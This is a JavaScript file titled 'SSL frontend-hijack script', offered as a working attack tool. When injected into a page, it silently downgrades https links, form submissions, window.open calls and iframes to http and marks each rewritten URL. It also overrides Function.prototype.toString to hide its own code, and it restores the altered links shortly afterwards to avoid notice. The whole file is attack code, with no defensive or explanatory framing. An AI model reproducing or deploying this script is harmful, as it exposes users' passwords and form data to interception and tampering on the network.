/**
 * SSL frontend-hijack script
 *   @version 0.1.1
 *   @update 2014/10/28
 */
(function () {
	// hook location
	Object.freeze(document.location)

	// for ie6,7,8
	var DOM_3 = !!window.addEventListener;

	function $bind(target, event, callback) {
		if (DOM_3) {
			target.addEventListener(event, callback);
		}
		else {
			target.attachEvent('on' + event, callback);
		}
	}

	function $operator(fn, thiz, $) {
		// standard
		if ('apply' in fn) {
			return fn.apply(thiz, $);
		}
		// functor (old-ie)
		switch ($.length) {
			case 0 :
				return fn();
			case 1 :
				return fn($[0]);
			case 2 :
				return fn($[0], $[1]);
			case 3 :
				return fn($[0], $[1], $[2]);
			default:
				return fn($[0], $[1], $[2], $[3]);
		}
	}

	//
	// url transform
	//
	var R_HTTPS = /^https:/i;
	var R_FAKE = /[?&]zh_cn#?/;
	var FAKE_SYMBOL = 'zh_cn';

	function isFakeUrl(url) {
		return R_FAKE.test(url);
	}

	function isHttpsUrl(url) {
		return url && R_HTTPS.test(url);
	}

	function downgradeUrl(url) {
		// change protocol, and make a mark
		return url.replace(R_HTTPS, 'http:') +
			(/\?/.test(url) ? '&' : '?') + FAKE_SYMBOL;
	}

	//
	// Hook System
	//
	var _hasOwnProperty = Object.prototype.hasOwnProperty;  // for old-IE
	function hook(ns, key, factory) {
		if (!_hasOwnProperty.call(ns, key)) {
			return false;
		}
		var oldFn = ns[key];
		var newFn = factory(oldFn);
		newFn._str_ = oldFn + '';
		ns[key] = newFn;
		return true;
	}

	// hidden source code
	function toString_factory(oldFn) {
		return function () {
			return this._str_ || oldFn.apply(this, arguments);
		};
	}

	hook(Function.prototype, 'toString', toString_factory);
	hook(Function.prototype, 'toSource', toString_factory);
	//
	// hook window.open('https://...')
	//
	function winopen_factory(oldFn) {
		return function (url) {
			if (isHttpsUrl(url)) {
				arguments[0] = downgradeUrl(url);
			}
			return $operator(oldFn, this, arguments);
		};
	}

	if (window.Window) {
		hook(Window.prototype, 'open', winopen_factory);
	}
	hook(window, 'open', winopen_factory);
	//
	// Event Hook
	//
	function cheat(el, urlProp) {
		var url = el[urlProp];
		el[urlProp] = downgradeUrl(url);
		// restore later
		setTimeout(function () {
			el[urlProp] = url;
		}, 100);
	}

	// hook <a href="https://...">
	$bind(document, 'click', function (e) {
		e = e || event;
		var el = e.target || e.srcElement;
		do {
			if (el.tagName == 'A') {
				if (el.protocol == 'https:') {
					cheat(el, 'href');
				}
			}
		} while (el = el.parentNode);
	});
	// hook <form action="https://...">
	if (DOM_3) {
		$bind(document, 'submit', submitHandler);
	}
	else {
		setInterval(function () {
			var forms = document.getElementsByTagName('form');
			for (var i = forms.length - 1; i >= 0; i--) {
				var form = forms[i];
				if (!form._hooked_) {
					form._hooked_ = true;
					$bind(form, 'submit', submitHandler);
				}
			}
		}, 500);
	}
	function submitHandler(e) {
		e = e || event;
		var el = e.target || e.srcElement;
		if (isHttpsUrl(el.action)) {
			cheat(el, 'action');
		}
	}

	//
	// monitor <iframe src="https://...">
	//
	function scanFrames(el) {
		var frames = document.getElementsByTagName('iframe');
		for (var i = 0, n = frames.length; i < n; i++) {
			var el = frames[i];
			if (isHttpsUrl(el.src)) {
				el.src = downgradeUrl(el.src);
			}
		}
	}

	var timer = setInterval(scanFrames, 20);
	$bind(window, 'load', function () {
		clearInterval(timer);
		setInterval(scanFrames, 200);
	})
})()